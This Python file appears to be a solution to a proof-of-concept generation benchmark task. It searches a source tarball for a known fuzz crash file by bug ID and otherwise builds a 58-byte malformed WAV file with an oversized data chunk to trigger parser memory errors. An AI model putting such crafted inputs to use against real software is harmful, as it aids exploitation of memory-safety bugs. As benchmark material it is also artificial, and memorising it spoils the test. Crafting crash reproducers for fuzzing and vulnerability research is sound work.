import os
import tarfile
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to find an exact PoC by ID in the tarball/directory
        data = self._find_poc_by_id(src_path, "382816119")
        if data is not None:
            return data

        # Try to heuristically find a RIFF/WAVE file likely to be the PoC
        data = self._find_riff_poc(src_path, target_len=58)
        if data is not None:
            return data

        # Fallback: generate a crafted RIFF/WAVE that commonly triggers improper RIFF/data handling
        return self._crafted_wav_58bytes()

    def _iter_files(self, path):
        max_size = 5 * 1024 * 1024  # 5 MB
        if os.path.isdir(path):
            for root, _, files in os.walk(path):
                for fname in files:
                    fpath = os.path.join(root, fname)
                    try:
                        if os.path.getsize(fpath) <= max_size:
                            with open(fpath, "rb") as f:
                                yield fpath, f.read()
                    except Exception:
                        continue
        else:
            try:
                with tarfile.open(path, mode="r:*") as tf:
                    for member in tf.getmembers():
                        if not member.isfile():
                            continue
                        if member.size > max_size:
                            continue
                        try:
                            f = tf.extractfile(member)
                            if f is None:
                                continue
                            data = f.read()
                            yield member.name, data
                        except Exception:
                            continue
            except Exception:
                # If not a tarball, try to read as plain file
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                        yield path, data
                except Exception:
                    pass

    def _find_poc_by_id(self, src_path, bug_id):
        bug_id = str(bug_id)
        for name, data in self._iter_files(src_path):
            lname = name.lower()
            if bug_id in lname:
                return data
        return None

    def _is_riff(self, data):
        if len(data) < 12:
            return False
        if data[0:4] != b"RIFF":
            return False
        # Accept common RIFF types
        riff_type = data[8:12]
        if riff_type in (b"WAVE", b"WEBP", b"AVI ", b"RMID"):
            return True
        return False

    def _parse_riff_chunks(self, data):
        # Returns list of (chunk_id, size, offset_of_data, total_chunk_size_with_header)
        # Note: Little-endian sizes
        if len(data) < 12:
            return []
        pos = 12
        chunks = []
        total_len = len(data)
        while pos + 8 <= total_len:
            cid = data[pos:pos + 4]
            size = int.from_bytes(data[pos + 4:pos + 8], "little", signed=False)
            data_off = pos + 8
            padded_size = size + (size & 1)  # chunks are word-aligned
            total_chunk = 8 + padded_size
            chunks.append((cid, size, data_off, total_chunk))
            # Avoid infinite loops
            if total_chunk <= 0:
                break
            pos += total_chunk
        return chunks

    def _is_wav_with_suspicious_data(self, data):
        # Detects WAVE with a 'data' chunk whose size looks inconsistent or risky
        if not self._is_riff(data):
            return False
        if data[8:12] != b"WAVE":
            return False
        riff_size = int.from_bytes(data[4:8], "little", signed=False)
        riff_end = 8 + riff_size
        total_len = len(data)
        chunks = self._parse_riff_chunks(data)
        found_data = False
        for cid, size, data_off, total_chunk in chunks:
            if cid == b"data":
                found_data = True
                # Criteria: data size exceeds file bounds or RIFF end, which is typical for the bug
                if data_off + size > total_len:
                    return True
                if data_off + size > riff_end:
                    return True
                # Very large data size is also suspicious
                if size > 0x7FFFFFFF:
                    return True
        # If 'data' not found but RIFF is WAVE, it's less likely our PoC
        return found_data and False

    def _find_riff_poc(self, src_path, target_len=58):
        candidates = []
        for name, data in self._iter_files(src_path):
            if not data:
                continue
            if self._is_riff(data) and data[8:12] == b"WAVE":
                score = 0
                # Prefer filenames that hint at fuzz/crash/oss-fuzz/poc
                lname = name.lower()
                hints = ["fuzz", "oss-fuzz", "clusterfuzz", "crash", "poc", "repro", "regress"]
                for h in hints:
                    if h in lname:
                        score += 5
                # Prefer suspicious WAVs
                if self._is_wav_with_suspicious_data(data):
                    score += 20
                # Prefer length close to target_len
                score -= abs(len(data) - target_len)
                candidates.append((score, len(data), name, data))
        if candidates:
            candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
            return candidates[0][3]
        return None

    def _crafted_wav_58bytes(self):
        # Create a 58-byte WAV with intentionally inconsistent sizes to trigger RIFF/data boundary issues.
        # Layout:
        # 0  RIFF
        # 4  riff_size (set small to restrict RIFF boundary)
        # 8  WAVE
        # 12 'fmt ' + size 16 + PCM mono 8000 Hz 8-bit
        # 36 'data' + huge size (0xFFFFFF00) + 14 bytes payload (file ends shortly after start of 'data' payload)
        # This aims to stress parsers that don't properly bound 'data' by RIFF end and/or file size.
        riff = b"RIFF"
        # Set RIFF size to include WAVE + fmt (16) + data header, but not data payload
        riff_size = 36  # 4 (WAVE) + 8 (fmt hdr) + 16 (fmt data) + 8 (data hdr)
        wave = b"WAVE"
        fmt_chunk = (
            b"fmt " +
            struct.pack("<I", 16) +              # fmt chunk size
            struct.pack("<H", 1) +               # PCM
            struct.pack("<H", 1) +               # Channels = 1
            struct.pack("<I", 8000) +            # SampleRate
            struct.pack("<I", 8000) +            # ByteRate
            struct.pack("<H", 1) +               # BlockAlign
            struct.pack("<H", 8)                 # BitsPerSample
        )
        data_header = b"data" + struct.pack("<I", 0xFFFFFF00)  # huge size to force overflow conditions
        # 14 bytes payload to reach 58 total bytes
        payload_len = 58 - (4 + 4 + 4 + len(fmt_chunk) + len(data_header))
        if payload_len < 0:
            payload_len = 0
        payload = b"\x00" * payload_len
        return riff + struct.pack("<I", riff_size) + wave + fmt_chunk + data_header + payload